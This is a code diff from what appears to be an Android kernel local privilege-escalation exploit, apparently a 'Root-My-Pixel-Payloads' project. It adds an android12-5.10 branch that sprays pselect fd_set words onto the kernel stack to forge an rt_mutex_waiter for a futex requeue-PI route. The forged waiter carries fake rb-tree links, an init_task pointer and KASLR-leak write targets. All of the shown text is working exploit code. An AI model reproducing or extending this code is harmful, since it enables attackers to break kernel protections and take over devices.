@@ -434,7 +434,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
-  int compact = active_offsets && active_offsets->compact_waiter;
+  /* NB: `active_offsets && active_offsets->compact_waiter` would collapse the
+   * value to a boolean (0/1) and make the compact_waiter==2 case unreachable. */
+  int compact = active_offsets ? (int)active_offsets->compact_waiter : 0;
 
   struct pselect_waiter_word {
     int word;
@@ -442,7 +444,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     const char *name;
   };
 
-  if (compact) {
+  if (compact == 1) {
     /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
      * the write value, children the write target; waiter->task is the
      * payload fake_task (planted fields for the PI walk). Value writes relink
@@ -467,6 +469,56 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
       pselect_put_waiter_word(
           in, out, ex, words_per_set, w->word, w->value, w->name);
     }
+  } else if (compact == 2) {
+    /* android12-5.10 FLAT rt_mutex_waiter (no rt_waiter_node nesting, no
+     * wake_state/ww_ctx), verified against the eqs Image disasm:
+     *   tree_entry 0x00  pi_tree_entry 0x18  task 0x30
+     *   lock 0x38  prio 0x40  deadline 0x48    (sizeof 0x50)
+     * Core word numbering is waiter_offset/8 + 2, so tree_pc=2 .. deadline=11.
+     * The per-target pselect_waiter_shift stores the RAW frame delta (0 on eqs:
+     * pselect6 stack_fds == futex_wait_requeue_pi rt_waiter == S0-0x210), so the
+     * core's +2 convention is removed here: global = raw_shift + offset/8.
+     * Words 0/1/2 and 7 come from the armed slide route's overrides (see
+     * slide_eqs.c); without an override this is the KASLR leak's shape:
+     *   *(SLIDE_RANDOM_BOOT_ID_DATA) = SLIDE_LOGGERS_0_1,
+     *   collateral *(SLIDE_LOGGERS_0_1 + 8) = SLIDE_RANDOM_BOOT_ID_DATA.
+     * waiter->task is the direct-map alias of init_task, exactly as the proven
+     * standalone eqs leak; the fake rt_mutex is a fresh zeroed .bss slot. */
+    int shift = pselect_waiter_shift() - 2;
+    uint64_t w0 = slide_override_active ? slide_override_w0 : SLIDE_LOGGERS_0_1;
+    uint64_t w1 = slide_override_active ? slide_override_w1 : 0;
+    uint64_t w2 =
+        slide_override_active ? slide_override_w2 : SLIDE_RANDOM_BOOT_ID_DATA;
+    uint64_t lock = slide_override_active ? slide_override_lock : fake_lock;
+    uint64_t prio = g_eqs_waiter_prio ? g_eqs_waiter_prio : FAKE_WAITER_PRIO;
+    struct pselect_waiter_word words[] = {
+      {2, w0, "tree_pc"},       /* tree_entry.__rb_parent_color 0x00 */
+      {3, w1, "tree_right"},    /* tree_entry.rb_right          0x08 */
+      {4, w2, "tree_left"},     /* tree_entry.rb_left           0x10 */
+      {5, w0, "pi_parent"},     /* pi_tree_entry.__rb_parent_color 0x18 */
+      {6, w1, "pi_right"},      /* pi_tree_entry.rb_right       0x20 */
+      {7, w2, "pi_left"},       /* pi_tree_entry.rb_left        0x28 */
+      {8, SLIDE_INIT_TASK, "task"},  /* task                    0x30 */
+      {9, lock, "lock"},        /* lock                         0x38 */
+      {10, prio, "prio"},       /* prio (flat)                  0x40 */
+      {11, 0, "deadline"},      /* deadline (flat)              0x48 */
+    };
+    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+      struct pselect_waiter_word *w = &words[i];
+      int global_word = shift + w->word;
+      if (!pselect_put_global_word(
+              in, out, ex, words_per_set, global_word, w->value)) {
+        pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
+                   "words_per_set=%d nfds=%d\n",
+                   w->name, w->word, global_word, words_per_set,
+                   PSELECT_ROUTE_NFDS);
+      }
+    }
+    pr_info("pselect 5.10 flat overlay raw_shift=%d core_word_base=2 "
+            "shift=%d w0=%016llx w2=%016llx lock=%016llx prio=%llu\n",
+            pselect_waiter_shift(), shift, (unsigned long long)w0,
+            (unsigned long long)w2, (unsigned long long)lock,
+            (unsigned long long)prio);
   } else {
     /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
     struct pselect_waiter_word words[] = {
